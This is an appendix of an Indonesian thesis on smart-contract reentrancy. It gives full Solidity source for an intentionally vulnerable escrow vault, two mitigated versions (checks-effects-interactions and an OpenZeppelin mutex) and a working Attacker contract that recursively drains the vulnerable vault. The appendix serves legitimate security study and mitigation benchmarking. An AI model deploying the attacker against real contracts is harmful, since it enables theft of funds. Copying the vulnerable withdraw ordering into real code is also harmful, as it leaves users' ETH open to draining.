# Lampiran 9. Source Code Lengkap Kontrak Smart Contract

> **Cross-reference:** Mendukung pembahasan di **Bab 3.3 (Perancangan Simulasi Smart Contract)**, **Bab 4.1 (Uji Kerentanan dengan Slither)**, dan **Bab 4.2 (Simulasi Eksploitasi)**.
>
> **Repositori:** [github.com/nurcahyapriantoro/skripsi-final](https://github.com/nurcahyapriantoro/skripsi-final)
>
> Lampiran 1–4 pada skripsi hanya menampilkan fungsi `withdrawFunds()` untuk masing-masing kontrak. Lampiran ini memuat **seluruh isi file** agar reviewer dapat memverifikasi struktur lengkap (enum, struct, event, modifier, constructor, dan semua fungsi escrow).

---

## 9.1 InsecureVault.sol — Kontrak Rentan (Vulnerable Baseline)

**Lokasi di repositori:** [`contracts/vulnerable/InsecureVault.sol`](https://github.com/nurcahyapriantoro/skripsi-final/blob/main/contracts/vulnerable/InsecureVault.sol)
**Raw:** https://raw.githubusercontent.com/nurcahyapriantoro/skripsi-final/main/contracts/vulnerable/InsecureVault.sol
**Peran:** Kontrak baseline yang sengaja mempertahankan *interactions-before-effects* pada `withdrawFunds()` (Bab 3.3.1). Digunakan sebagai target eksploitasi pada Eksperimen 1 (Bab 4.2).

```solidity
pragma solidity 0.8.28;

contract InsecureVault {
    enum OrderStatus {
        CREATED,
        LOCKED,
        RELEASED,
        COMPLETED
    }

    struct Order {
        address buyer;
        address seller;
        uint256 amount;
        OrderStatus status;
    }

    mapping(uint256 => Order) public orders;
    mapping(address => uint256) public balances;

    uint256 public orderCount;

    event OrderCreated(uint256 indexed orderId, address indexed buyer, address indexed seller, uint256 amount);
    event FundsDeposited(uint256 indexed orderId, address indexed buyer, uint256 amount);
    event DeliveryConfirmed(uint256 indexed orderId, address indexed buyer);
    event FundsWithdrawn(address indexed seller, uint256 amount);

    function createOrder(address _seller) external returns (uint256 orderId) {
        require(_seller != address(0), "InsecureVault: seller cannot be zero address");
        require(_seller != msg.sender, "InsecureVault: buyer and seller cannot be the same");

        orderId = orderCount;
        orders[orderId] = Order({
            buyer: msg.sender,
            seller: _seller,
            amount: 0,
            status: OrderStatus.CREATED
        });
        orderCount++;

        emit OrderCreated(orderId, msg.sender, _seller, 0);
    }

    function depositFunds(uint256 _orderId) external payable {
        Order storage order = orders[_orderId];

        require(order.buyer == msg.sender, "InsecureVault: only buyer can deposit");
        require(order.status == OrderStatus.CREATED, "InsecureVault: order must be in CREATED state");
        require(msg.value > 0, "InsecureVault: deposit must be greater than zero");

        order.amount = msg.value;
        order.status = OrderStatus.LOCKED;

        balances[order.seller] += msg.value;

        emit FundsDeposited(_orderId, msg.sender, msg.value);
    }

    function confirmDelivery(uint256 _orderId) external {
        Order storage order = orders[_orderId];

        require(order.buyer == msg.sender, "InsecureVault: only buyer can confirm delivery");
        require(order.status == OrderStatus.LOCKED, "InsecureVault: order must be in LOCKED state");

        order.status = OrderStatus.RELEASED;

        emit DeliveryConfirmed(_orderId, msg.sender);
    }

    function withdrawFunds() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "InsecureVault: no funds to withdraw");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "InsecureVault: ETH transfer failed");

        balances[msg.sender] = 0;

        emit FundsWithdrawn(msg.sender, amount);
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getBalance(address _account) external view returns (uint256) {
        return balances[_account];
    }

    function getOrder(uint256 _orderId) external view returns (
        address buyer,
        address seller,
        uint256 amount,
        OrderStatus status
    ) {
        Order storage order = orders[_orderId];
        return (order.buyer, order.seller, order.amount, order.status);
    }

    receive() external payable {}
}
```

**Penjelasan blok:**
- **Baris 4–9 (`OrderStatus` enum):** Empat status siklus escrow rantai pasok (lihat Gambar 2). Transisi yang valid hanya `CREATED → LOCKED → RELEASED → COMPLETED`.
- **Baris 11–16 (`Order` struct):** Data satu pesanan: pembeli, penjual, jumlah ETH, dan status. Disimpan per `orderId` di mapping `orders`.
- **Baris 18–19 (mapping):** `orders` menyimpan semua pesanan; `balances` menyimpan saldo penarikan tiap penjual (akumulasi dari beberapa order).
- **Baris 21 (`orderCount`):** Counter monotonik untuk menghasilkan `orderId` baru.
- **Baris 23–26 (event):** Log on-chain untuk indexing off-chain (Lampiran 6).
- **Baris 28–42 (`createOrder`):** Pembeli mendaftarkan pesanan dengan penjual tertentu. Validasi: penjual tidak boleh nol atau sama dengan pembeli.
- **Baris 44–57 (`depositFunds`):** Pembeli mengirim ETH ke kontrak; status berubah ke `LOCKED`; saldo penjual di `balances` bertambah.
- **Baris 59–68 (`confirmDelivery`):** Pembeli mengkonfirmasi barang diterima; status ke `RELEASED`. Dana siap ditarik.
- **Baris 70–80 (`withdrawFunds`) — INTI SKRIPSI:** Mengirim ETH ke `msg.sender` **SEBELUM** `balances[msg.sender] = 0`. Inilah celah reentrancy yang dieksploitasi Attacker (Bab 4.2).
- **Baris 100 (`receive`):** Menerima ETH tanpa data; dibutuhkan agar kontrak bisa menjadi target pengirim ETH dari Attacker.

---

## 9.2 SecureVault.sol — Kontrak CEI (Mitigasi)

**Lokasi di repositori:** [`contracts/secure/SecureVault.sol`](https://github.com/nurcahyapriantoro/skripsi-final/blob/main/contracts/secure/SecureVault.sol)
**Raw:** https://raw.githubusercontent.com/nurcahyapriantoro/skripsi-final/main/contracts/secure/SecureVault.sol
**Peran:** Implementasi manual pola Checks-Effects-Interactions tanpa dependensi eksternal (Bab 3.3.2). `withdrawFunds()` menulis `balances[msg.sender] = 0` **sebelum** `call` eksternal.

```solidity
pragma solidity 0.8.28;

contract SecureVault {
    enum OrderStatus {
        CREATED,
        LOCKED,
        RELEASED,
        COMPLETED
    }

    struct Order {
        address buyer;
        address seller;
        uint256 amount;
        OrderStatus status;
    }

    mapping(uint256 => Order) public orders;
    mapping(address => uint256) public balances;

    uint256 public orderCount;

    event OrderCreated(uint256 indexed orderId, address indexed buyer, address indexed seller, uint256 amount);
    event FundsDeposited(uint256 indexed orderId, address indexed buyer, uint256 amount);
    event DeliveryConfirmed(uint256 indexed orderId, address indexed buyer);
    event FundsWithdrawn(address indexed seller, uint256 amount);

    function createOrder(address _seller) external returns (uint256 orderId) {
        require(_seller != address(0), "SecureVault: seller cannot be zero address");
        require(_seller != msg.sender, "SecureVault: buyer and seller cannot be the same");

        orderId = orderCount;
        orders[orderId] = Order({
            buyer: msg.sender,
            seller: _seller,
            amount: 0,
            status: OrderStatus.CREATED
        });
        orderCount++;

        emit OrderCreated(orderId, msg.sender, _seller, 0);
    }

    function depositFunds(uint256 _orderId) external payable {
        Order storage order = orders[_orderId];

        require(order.buyer == msg.sender, "SecureVault: only buyer can deposit");
        require(order.status == OrderStatus.CREATED, "SecureVault: order must be in CREATED state");
        require(msg.value > 0, "SecureVault: deposit must be greater than zero");

        order.amount = msg.value;
        order.status = OrderStatus.LOCKED;
        balances[order.seller] += msg.value;

        emit FundsDeposited(_orderId, msg.sender, msg.value);
    }

    function confirmDelivery(uint256 _orderId) external {
        Order storage order = orders[_orderId];

        require(order.buyer == msg.sender, "SecureVault: only buyer can confirm delivery");
        require(order.status == OrderStatus.LOCKED, "SecureVault: order must be in LOCKED state");

        order.status = OrderStatus.RELEASED;

        emit DeliveryConfirmed(_orderId, msg.sender);
    }

    function withdrawFunds() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "SecureVault: no funds to withdraw");

        balances[msg.sender] = 0;
        emit FundsWithdrawn(msg.sender, amount);

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "SecureVault: ETH transfer failed");
        
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getBalance(address _account) external view returns (uint256) {
        return balances[_account];
    }

    function getOrder(uint256 _orderId) external view returns (
        address buyer,
        address seller,
        uint256 amount,
        OrderStatus status
    ) {
        Order storage order = orders[_orderId];
        return (order.buyer, order.seller, order.amount, order.status);
    }

    receive() external payable {}
}
```

**Penjelasan blok:**
- **Struktur identik dengan InsecureVault** kecuali urutan di `withdrawFunds()`. Perbandingan apples-to-apples ini disengaja (Bab 3.3.2) agar selisih gas benar-benar berasal dari urutan logika, bukan dari perbedaan struktur.
- **Baris 69–80 (`withdrawFunds`) — INTI PERBAIKAN:**
  - **CHECKS (L70–71):** Ambil `amount`; `require(amount > 0)`.
  - **EFFECTS (L73–74):** `balances[msg.sender] = 0` DULU, baru emit event.
  - **INTERACTIONS (L76):** `call{value: amount}("")` PALING AKHIR.
- Konsekuensi: Saat `receive()` Attacker mencoba re-entry, `require(amount > 0)` langsung *revert* karena `amount = 0` (sudah di-nol-kan).

---

## 9.3 MutexVault.sol — Kontrak Mutex Lock (Mitigasi OpenZeppelin)

**Lokasi di repositori:** [`contracts/secure/MutexVault.sol`](https://github.com/nurcahyapriantoro/skripsi-final/blob/main/contracts/secure/MutexVault.sol)
**Raw:** https://raw.githubusercontent.com/nurcahyapriantoro/skripsi-final/main/contracts/secure/MutexVault.sol
**Peran:** Implementasi dengan modifier `nonReentrant` dari OpenZeppelin ReentrancyGuard (Bab 3.3.3). **Urutan interactions-before-effects sengaja dipertahankan** agar selisih gas terhadap SecureVault murni berasal dari overhead mutex.

```solidity
pragma solidity 0.8.28;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
contract MutexVault is ReentrancyGuard {

    enum OrderStatus {
        CREATED,
        LOCKED,
        RELEASED,
        COMPLETED
    }

    struct Order {
        address buyer;
        address seller;
        uint256 amount;
        OrderStatus status;
    }

    mapping(uint256 => Order) public orders;
    mapping(address => uint256) public balances;
    uint256 public orderCount;

    event OrderCreated(uint256 indexed orderId, address indexed buyer, address indexed seller, uint256 amount);
    event FundsDeposited(uint256 indexed orderId, address indexed buyer, uint256 amount);
    event DeliveryConfirmed(uint256 indexed orderId, address indexed buyer);
    event FundsWithdrawn(address indexed seller, uint256 amount);

    function createOrder(address _seller) external returns (uint256 orderId) {
        require(_seller != address(0), "MutexVault: seller cannot be zero address");
        require(_seller != msg.sender, "MutexVault: buyer and seller cannot be the same");

        orderId = orderCount;
        orders[orderId] = Order({
            buyer: msg.sender,
            seller: _seller,
            amount: 0,
            status: OrderStatus.CREATED
        });
        orderCount++;

        emit OrderCreated(orderId, msg.sender, _seller, 0);
    }

    function depositFunds(uint256 _orderId) external payable {
        Order storage order = orders[_orderId];

        require(order.buyer == msg.sender, "MutexVault: only buyer can deposit");
        require(order.status == OrderStatus.CREATED, "MutexVault: order must be in CREATED state");
        require(msg.value > 0, "MutexVault: deposit must be greater than zero");

        order.amount = msg.value;
        order.status = OrderStatus.LOCKED;
        balances[order.seller] += msg.value;

        emit FundsDeposited(_orderId, msg.sender, msg.value);
    }

    function confirmDelivery(uint256 _orderId) external {
        Order storage order = orders[_orderId];

        require(order.buyer == msg.sender, "MutexVault: only buyer can confirm delivery");
        require(order.status == OrderStatus.LOCKED, "MutexVault: order must be in LOCKED state");

        order.status = OrderStatus.RELEASED;

        emit DeliveryConfirmed(_orderId, msg.sender);
    }

    function withdrawFunds() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "MutexVault: no funds to withdraw");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "MutexVault: ETH transfer failed");

        balances[msg.sender] = 0;

        emit FundsWithdrawn(msg.sender, amount);
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getBalance(address _account) external view returns (uint256) {
        return balances[_account];
    }

    function getOrder(uint256 _orderId) external view returns (
        address buyer,
        address seller,
        uint256 amount,
        OrderStatus status
    ) {
        Order storage order = orders[_orderId];
        return (order.buyer, order.seller, order.amount, order.status);
    }

    receive() external payable {}
}
```

**Penjelasan blok:**
- **Baris 3:** `import ReentrancyGuard` dari OpenZeppelin v5.6.1.
- **Baris 4:** `contract MutexVault is ReentrancyGuard` — mewarisi semua fungsi pelindung.
- **Baris 70 (`withdrawFunds`):** Modifier `nonReentrant` ditambahkan. OpenZeppelin menulis variabel `_status` (L42 di `ReentrancyGuard`) dari `_NOT_ENTERED` ke `_ENTERED` di awal, dan mengembalikannya di akhir. Inilah yang menyebabkan overhead 2 SSTORE + 1 SLOAD (Bab 4.4.4).
- **Urutan identik dengan InsecureVault** (interactions → effects) untuk isolasi variabel: selisih gas murni dari mutex, bukan dari perubahan urutan.

---

## 9.4 Attacker.sol — Kontrak Penyerang

**Lokasi di repositori:** [`contracts/attacker/Attacker.sol`](https://github.com/nurcahyapriantoro/skripsi-final/blob/main/contracts/attacker/Attacker.sol)
**Raw:** https://raw.githubusercontent.com/nurcahyapriantoro/skripsi-final/main/contracts/attacker/Attacker.sol
**Peran:** Mengimplementasikan reentrancy exploit dengan recursive `receive()` callback (Bab 3.3.4, Lampiran 4).

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IVault {
    function withdrawFunds() external;
    function getBalance(address _account) external view returns (uint256);
    function getContractBalance() external view returns (uint256);
}

contract Attacker {

    IVault public immutable target;
    address public immutable owner;
    uint256 public constant MAX_REENTRIES = 30;
    uint256 public reentrancyCount;

    event AttackInitiated(address indexed target, uint256 attackerBalance);
    event ReentryTriggered(uint256 indexed iteration, uint256 targetBalance);
    event AttackCompleted(uint256 totalDrained);

    constructor(address _target) {
        require(_target != address(0), "Attacker: invalid target address");
        target = IVault(_target);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "Attacker: only owner can initiate attack");
        require(
            target.getBalance(address(this)) > 0,
            "Attacker: no balance in target to withdraw"
        );

        reentrancyCount = 0;
        emit AttackInitiated(address(target), target.getContractBalance());
        target.withdrawFunds();
        emit AttackCompleted(address(this).balance);
    }

    receive() external payable {
        reentrancyCount++;
        uint256 targetBalance = target.getContractBalance();
        emit ReentryTriggered(reentrancyCount, targetBalance);
        if (targetBalance > 0 && reentrancyCount < MAX_REENTRIES) {
            target.withdrawFunds();
        }
    }

    function collectFunds() external {
        require(msg.sender == owner, "Attacker: only owner can collect funds");
        uint256 balance = address(this).balance;
        require(balance > 0, "Attacker: nothing to collect");

        (bool success, ) = owner.call{value: balance}("");
        require(success, "Attacker: collection transfer failed");
    }

    function getAttackerBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getReentrancyCount() external view returns (uint256) {
        return reentrancyCount;
    }
}
```

**Penjelasan blok:**
- **Baris 4–8 (`IVault` interface):** Deklarasi interface di top-level (bukan di dalam contract) karena Solidity tidak mengizinkan nested interface. Interface ini mendefinisikan 3 fungsi yang dipanggil Attacker.
- **Baris 10:** State variables: `target` (immutable — kontrak vault yang diserang), `owner` (immutable — EOA yang punya hak), `MAX_REENTRIES = 30` (batas atas untuk mencegah gas habis).
- **Baris 27–38 (`attack`):** Hanya owner yang bisa memulai. Reset counter, log event, panggil `withdrawFunds()`.
- **Baris 40–47 (`receive`) — INTI EKSPLOITASI:** Setiap kali vault mengirim ETH ke Attacker, EVM memicu `receive()`. Fungsi ini langsung memanggil `withdrawFunds()` lagi **sebelum** vault sempat menulis `balances = 0`. Loop berhenti jika vault kosong atau sudah 30 iterasi.
- **Baris 49–56 (`collectFunds`):** Exfiltrasi dana curian dari Attacker contract ke EOA owner.

— **Akhir Lampiran 9** —
